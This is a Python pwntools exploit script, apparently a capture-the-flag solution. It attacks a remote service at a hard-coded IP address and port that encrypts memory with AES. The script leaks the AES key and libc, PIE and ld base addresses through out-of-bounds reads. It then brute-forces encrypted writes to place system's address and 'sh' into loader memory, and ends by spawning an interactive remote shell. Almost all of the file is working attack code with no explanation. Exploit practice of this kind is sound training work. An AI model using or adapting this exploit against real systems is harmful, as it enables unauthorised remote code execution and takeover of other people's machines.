from pwn import *
import random
from Crypto.Cipher import AES

for offsetlol in [0x3f1]*30:

  TEST_OFF = 0x30

  def aesencode(key, iv, text):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    msg = cipher.encrypt(text)
    return msg

  def aesdecode(key, iv, text):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    msg = cipher.decrypt(text)
    return msg

  r = None

  buf = 0x00000000002023A0
  key = 0x0000000000202380
  iv = 0x0000000000202390
  freadgot = 0x0000000000201F98
  stderr = 0x0000000000202360

  def senddice(offset, size):
    r.sendline(str(offset))
    r.recvuntil("size:")
    r.sendline(str(size))
    return r.recvuntil("offset:").replace("offset:", "")

  def dobrute2(key, sequence, firstiv):

    restore = ["\x00"]*(16+15)
    hookrestore = ["\x00"]*50
    for i in range(len(firstiv)):
      hookrestore[i] = firstiv[i]

    total = []
    #print("".join(hookrestore).encode("hex"))

    for i in range(8):
      iv = restore[:]
      hook = hookrestore[:]
      rands = []
      c = 0

      while True:
        temp = random.randint(-0x10, -0x1)
        rands.append(temp)
        left = temp + 0x10
        seq = "".join(iv[left:left+0x10])
        res = aesencode(key, "".join(iv[0:0x10]), seq)
        for a in range(0x10):
          iv[left + a] = res[a]


        test = aesencode(key, "".join(iv[0:0x10]), "".join(hook[i:i+0x10]))
        if test[0] == sequence[i]:
          restore = iv[:]
          hookrestore = hook[:]
          for a in range(0x10):
            hookrestore[i + a] = test[a]
          #print("FOUND")
          break
        c += 1
        if c == 3:
          iv = restore[:]
          hook = hookrestore[:]
          rands = []
          c = 0
      #print(rands)
      #print("".join(restore).encode("hex"))
      #print("".join(hookrestore).encode("hex"))
      total.append(rands)
    return total


  restore = ["\x00"]*(16+15)
  hookrestore = ["\x00"]*50

  def dobrute(key, sequence, firstiv):
    global restore
    global hookrestore

    hookrestore = ["\x00"]*50

    for i in range(0x20):
      hookrestore[49 - 0x20 + i] = firstiv[i]

    total = []
    #print("".join(hookrestore).encode("hex"))

    for i in range(len(sequence)):
      iv = restore[:]
      hook = hookrestore[:]
      rands = []
      c = 0

      while True:
        temp = random.randint(-0x10, -0x1)
        rands.append(temp)
        left = temp + 0x10
        seq = "".join(iv[left:left+0x10])
        res = aesencode(key, "".join(iv[0:0x10]), seq)
        for a in range(0x10):
          iv[left + a] = res[a]


        test = aesencode(key, "".join(iv[0:0x10]), "".join(hook[49 - i - 0x10:(49 - i)]))
        if test[-1] == sequence[-1 - i]:
          restore = iv[:]
          hookrestore = hook[:]
          for a in range(0x10):
            hookrestore[49 - i - 0x10 + a] = test[a]
          #print("FOUND")
          break
        c += 1
        if c == 3:
          iv = restore[:]
          hook = hookrestore[:]
          rands = []
          c = 0
      #print(rands)
      #print("".join(restore).encode("hex"))
      #print("".join(hookrestore).encode("hex"))
      total.append(rands)
    return total


  """
  curseq = []
  key = ""
  for keychar in range(8):
    for testchar in range(0x40, 0xff+1):
      print hex(testchar)
      seq = findcombination2(chr(testchar), curseq)
      print(seq)
      dosequence2(curseq + [seq])
      ret2 = senddice(TEST_OFF+15 - keychar, 0x1)
      ret1 = senddice(-0x10-1 - keychar, 0x1)
      if ret1 == ret2:
        print("FOUND: " + chr(testchar))
        key += chr(testchar)
        curseq.append(seq)
        break
      r.close()
    print "CURRENT KEY: " + key.encode("hex")
  """

  #r = process("./chall")
  r = remote("3.113.219.89", 31337)
  r.recvuntil("offset:")
  key = senddice(-0x20, 0x1)

  leak = senddice(stderr - buf, 0x1)

  leak = u64(aesdecode(key, "\x00"*16, leak)[:8])

  leakoffset = 0x201e08

  libcbase = leak - 0x3ec680
  mallochook = libcbase + 0x3ebc30
  onegad = libcbase + 0x10a38c
  freehook = libcbase + 0x3ed8e8
  system = libcbase + 0x4f440
  environ = libcbase + 0x3ee098

  ldbase = libcbase + offsetlol * 0x1000

  leak = senddice(-0x398, 0x1)
  pie = u64(aesdecode(key, "\x00"*16, leak)[:8]) - 0x202008
  #print hex(offsetlol)
  #print hex(libcbase)
  #print hex(ldbase)

  buf = pie + buf

#leak = senddice(environ - buf, 1)
#stack = u64(aesdecode(key, "\x00"*16, leak)[:8])
#retloc = stack - 0xf0

  target = ldbase + 0x228f60

  desired = p64(system)[:6]
  location = target

  try:
    firstiv = senddice(location - buf - 0x10 + 6 - 0x10, 0x11)
  except:
    r.close()
    continue
  print("WE PASSED THE PROBLEM CHILD")
  print(hex(offsetlol))
  sequence = dobrute(key, desired, firstiv)

  for i in range(6):
    for a in sequence[i]:
      senddice(a, 0x1)
    #r.interactive()
    res = senddice(location - 0x10 - buf + 6 - i, 0x1)
    #print hex(ord(res[-1]))

  target = ldbase + 0x228968

  desired = "sh"
  location = target

  firstiv = senddice(location - buf - 0x10 + 2 - 0x10, 0x11)
  sequence = dobrute(key, desired, firstiv)

  try:
    for i in range(2):
      for a in sequence[i]:
        senddice(a, 0x1)
      #r.interactive()
      res = senddice(location - 0x10 - buf + 2 - i, 0x1)
      #print hex(ord(res[-1]))
  except:
    r.close()
    continue



  """
  desired = p64(onegad)
  print desired.encode("hex")
  location = target

  firstiv = senddice(location - buf, 0x11)
  sequence = dobrute2(key, desired, firstiv)

  for i in range(len(sequence)):
    for a in sequence[i]:
      senddice(a, 1)
    res = senddice(location - buf + i, 1)
    print hex(ord(res[0]))
  """
  pause()

  r.interactive()
